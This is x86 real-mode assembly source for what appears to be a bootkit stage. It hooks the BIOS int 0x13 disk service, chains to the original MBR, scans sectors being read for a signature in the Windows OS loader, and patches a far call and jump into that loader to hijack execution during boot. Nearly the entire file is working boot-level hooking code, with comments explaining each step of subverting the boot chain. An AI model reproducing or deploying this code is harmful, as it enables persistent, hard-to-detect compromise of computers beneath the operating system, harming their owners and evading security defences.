use16
ORG 0x00
	
;=============================================================================================
;Hook int 0x13 (Disk Service) and Read the original mbr into 0x7C00 and execute it
;=============================================================================================
start:
	push cs		;Set up segments
	pop ds	
	push cs
	pop es
	
	mov ah, 0x42	;Extended Disk Read
	mov dl, 0x80	;Hard Disk 1
	mov si, DAP1	;Pointer to Data Access Packet
	int 0x13
	jc StartFailed
	
	mov ax, [ss:0x4C]
	mov word [Old_Int13+1], ax		 ;Store original int 0x13 offset
	mov ax, [ss:0x4E]
	mov word [Old_Int13+3], ax		 ;Store original int 0x13 segment
	
	mov word [ss:0x4C], Int13Handler ;Our int 0x13 handler offset
	mov word [ss:0x4E], 0x8020		 ;Our code segment
	
	push 0x00	;Reset es and ds segment
	pop es
	push es
	pop ds
	
	push es
	push 0x7C00
StartFailed:
	retf	;Call Original MBR

	
;=============================================================================================
;This function is called every time int 0x13 is used, if a disk read operation is detected we
;will call one of 2 functions to scan the sector being read for a byte pattern
;=============================================================================================
Int13Handler:
	pushf
	cmp ah, 0x42	;0x42 function code = Extended Read Sectors From Drive
	jz PassToHook	;We need to catch all Extended Read calls
	
	cmp ah, 0x02	;0x02 function code = Read Sectors From Drive
	jz PassToHook	;We need to catch all Standard Read calls
	
	popf
	jmp Old_Int13 	;If not Read/Extened Read, call original int 0x13

PassToHook:
	popf
	jmp DiskReadHook ;We could just fall through into below function, but this looks cleaner
	
	
;=============================================================================================
;Whenever an Extended Read operation is done, this function is called we pass the data to
;ScanProtectedModeBytes function
;=============================================================================================
DiskReadHook:
	push bp
	mov bp, sp
	
	push ax							;Store the function ID for later
	
	pushf	;We are simulating an interrupt, which means pushing flags to stack
	call far dword [cs:Old_Int13+1]	;Call original int 0x13 to read sectors
	jc DiskReadHookEnd				;If call fails we are done
	
	pusha	;The call to original int 0x13 set some registers, we'll need to save them
	pushf	;same goes for flags
	push es
	
	mov ax, word [bp-2]
	cmp ah, 0x02		;Read and Extended read have different params
	jz	Params02		

Params42:				;Handle params from int 0x13 (Standard Read)	
	mov cx, ax			;Number of sectors that were read
	shl cx, 9			;Convert number of sectors to bytes
	
	mov di, [si+2]		;Offset that was read to
	push word [si+6]	;Sector that was read to
	pop es
	jmp ScanBytes
	
Params02:				;Handle params from int 0x13 (Extended Read)
	mov cx, ax			;Number of sectors that were read
	shl cx, 9			;Convert number of sectors to bytes
	mov di, bx			;Offset that was read to

ScanBytes:
	call ScanMoveOSLoader	;Scan the data for signature
	test ax, ax
	je HookEnd
	
	call HookMoveOSLoader	;if ax is non null, the bytes were found
	
HookEnd:
	pop es
	popf	;Restore the flags set by original int 0x13 to prevent errors
	popa	;Same goes for registers
	
DiskReadHookEnd:
	mov sp, bp
	pop bp
	retf 0x02

;=============================================================================================
;We are looking for the instructions that are used to move OSLoader.exe to 0x0401000
;The bytes are: FC F3 67 66 A5 66 8B 4E 0C 66 83 E1 03
; cld
; rep movsw
; mov cx, [esi+0x0C]
; and cx, 0x03
;=============================================================================================	
ScanMoveOSLoader:
	cld
	
ContinueScan:
	mov al, 0xFC 
	repne scasb		;Scan for first byte of signature (cld)
	jne NotFound
	
	cmp dword [es:di+0], 0xA56667F3	;Check the next 4 bytes (rep movsw)
	jne ContinueScan
	
	cmp dword [es:di+4], 0x0C4E8B66	;Check the next 4 bytes (mov cx, [esi+0x0C])
	jne ContinueScan
	
	cmp dword [es:di+8], 0x03E18366	;Check the next 4 bytes (and cx, 0x03)
	jne ContinueScan
	
	lea ax, [di-1]	;All 13 bytes were found, move their address into ax and return
	jmp ScanDone
	
NotFound:
	xor ax, ax

ScanDone:
	retn

	
;=============================================================================================
;We need to hook OSLoader.exe entry point to scan for next signature, so we need to wait till
;OSLoader is loaded into memory, we do this by setting a hook after the instruction used to 
;move the loader to 0x401000 so we can set our next hook on BlAllocateAlignedDescriptor
;We also remove the int 0x13 hook as it is nolonger useful
;=============================================================================================	
HookMoveOSLoader:
	push ds
	push fs
	
	push 0x8020
	pop fs
	
	push 0x00
	pop ds
	
	mov dx, word [fs:Old_Int13+1]	;Store original int 0x13 offset into dx
	mov [0x4C], dx					;Restore int 0x13 offset
	mov dx, word [fs:Old_Int13+3]	;Store original int 0x13 segment into dx
	mov [0x4E], dx					;Restore int 0x13 segment
	
	xor edi, edi ;Make sure the high word of edi is null
	mov di, ax	 ;ax still contains the address signature was found at
	add di, 0x05 ;We hook 5 bytes into the signature (just after rep movsw)
	
	push es
	pop fs

	;We face a unique problem: the cpu is in protected mode (no real mode segmentation)
	;but the current code segment points to GDT descriptor 0x0B (16-bit code)
	;This means we can't use 32-bit relative jumps or real mode far jumps; the soulution?
	;We use a far call to change the code segment to 0x0008 (GDT descriptor 0x01) because
	;GDT descriptor 1 is a 32-bit code segment starting at 0x00 so by jumping to 0x08:0x400
	;we switch to 32-bit code and jump to address 0x600, here we can store a 32-bit relative
	;jump to get to address 0x800400, 0x600 is right after the bios data area and is free
	mov byte [fs:di+0], 0x9A	;Far call
	mov word [fs:di+1], 0x600	;Jump to address 0x00000600
	mov word [fs:di+3], 0x0008	;GDT descriptor 0x01 (32-bit code segment base: 0x00000000)

	mov di, 0x600				;We store the 32-bit relative jump at 0x600
	mov byte [di], 0xE9			;relative 32-bit jump to HookOSLoader
	mov dword [di+1], (0x7FDFB)	;Offset to loader32 (0x605 + 0x7FFFB = 0x80400)
	
	pop fs
	pop ds
	retn

	
;=============================================================================================	
; Data area
;=============================================================================================	
DAP1            	db 0x10, 0x00	;Data Access Packet to read hard disk MBR into 0x7C00
  .NumSectors   	dw 0x01
  .Offset       	dw 0x7C00
  .Segment    		dw 0x00
  .TargetSector 	dq 0x00
  
Old_Int13 			db 0xEA,0x00,0x00,0x00,0x00	;Here we store the original int 0x13 bytes
